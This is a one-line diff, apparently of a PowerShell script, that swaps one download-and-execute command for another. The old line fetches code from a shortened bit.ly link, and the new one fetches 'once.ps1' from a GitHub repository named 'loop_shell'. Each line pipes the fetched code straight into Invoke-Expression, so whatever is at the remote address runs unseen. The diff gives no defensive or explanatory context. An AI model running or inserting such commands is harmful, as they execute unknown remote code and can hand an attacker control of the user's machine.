@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri https://bit.ly/3Q9qej8 | Invoke-Expression
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/anaprivate/loop_shell/refs/heads/main/once.ps1 | Invoke-Expression
